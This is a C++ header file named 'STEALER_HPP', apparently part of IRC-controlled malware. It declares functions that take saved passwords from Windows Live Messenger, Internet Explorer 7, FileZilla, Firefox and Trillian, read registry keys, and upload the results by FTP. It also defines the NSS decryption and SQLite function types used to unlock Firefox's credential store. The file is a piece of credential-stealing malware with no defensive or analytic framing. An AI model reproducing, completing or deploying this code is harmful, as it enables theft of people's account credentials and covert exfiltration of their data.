#ifndef STEALER_HPP
#define STEALER_HPP

#include "../Includes/includes.hpp"

class IRC;
class API;

int StealIt(IRC *irc, API* api, string host, string port, string user, string pass);
int FTPUpload ( IRC* irc, API *api, string file, string host, string port, string username, string password );
string GetWLMPasswords( API *api );
string ReadRegistryKey (API *api, HKEY hKey, LPCTSTR lpSubKey, LPCTSTR lpValueName);
string GetFileData (API *api, string lpFileName);
string GetIE7Passwords( API *api );
void GetHashStr(API *api, wchar_t *Password,char *HashStr);
string PrintData(API* api, char *Data);
string GetFileZillaPasswords( API* api, string sitemanager );
string GetFireFoxPasswords ( API* api, string appdata );
string GetTrillianPasswords( API* api, string accounts );

typedef enum _SECItemType{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
} SECItemType;

typedef struct _SECItem{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
} SECItem;
typedef enum _SECStatus{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
} SECStatus;

typedef struct PRArenaPool  PRArenaPool; 

typedef SECStatus (CDECL *NSS_Init)(const char *configdir);
typedef DWORD *	(CDECL *PK11_GetInternalKeySlot) (void);
typedef SECStatus (CDECL *PK11_Authenticate)(DWORD *slot, int loadCerts, void *wincx);
typedef SECStatus (CDECL *PK11SDR_Decrypt)(SECItem *data, SECItem *result, void *cx);
typedef void (CDECL *PK11_FreeSlot)(DWORD *slot);
typedef SECStatus (CDECL *NSS_Shutdown)(void);
typedef SECItem * (CDECL *NSSBase64_DecodeBuffer)(PRArenaPool *arenaOpt, SECItem *outItemOpt, const char *inStr, unsigned int inLen);

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;

typedef int (_cdecl *sqlite3_open)(
      const char *filename,   /* Database filename (UTF-8) */
      sqlite3 **ppDb          /* OUT: SQLite db handle */
    );

typedef int (_cdecl *sqlite3_prepare_v2)(
    sqlite3 *db,            /* Database handle */
    const char *zSql,       /* SQL statement, UTF-8 encoded */
    int nByte,              /* Maximum length of zSql in bytes. */
    sqlite3_stmt **ppStmt,  /* OUT: Statement handle */
    const char **pzTail     /* OUT: Pointer to unused portion of zSql */
    );

typedef int (_cdecl *sqlite3_close)(sqlite3 *);

typedef int (_cdecl *sqlite3_step)(sqlite3_stmt *);

typedef const unsigned char * (_cdecl *sqlite3_column_text)(sqlite3_stmt *, int iCol);

#endif